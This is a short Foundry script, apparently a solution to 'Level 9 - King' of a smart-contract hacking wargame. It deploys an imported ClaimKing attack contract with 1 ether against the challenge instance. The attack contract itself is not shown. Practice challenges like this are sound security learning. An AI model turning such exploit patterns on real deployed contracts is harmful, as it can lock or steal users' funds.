// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {ClaimKing} from "../src/Level9.sol";

// ================================================================
// │                         LEVEL 9 - KING                       │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        new ClaimKing{value: 1 ether}(targetContractAddress);
        vm.stopBroadcast();
    }
}
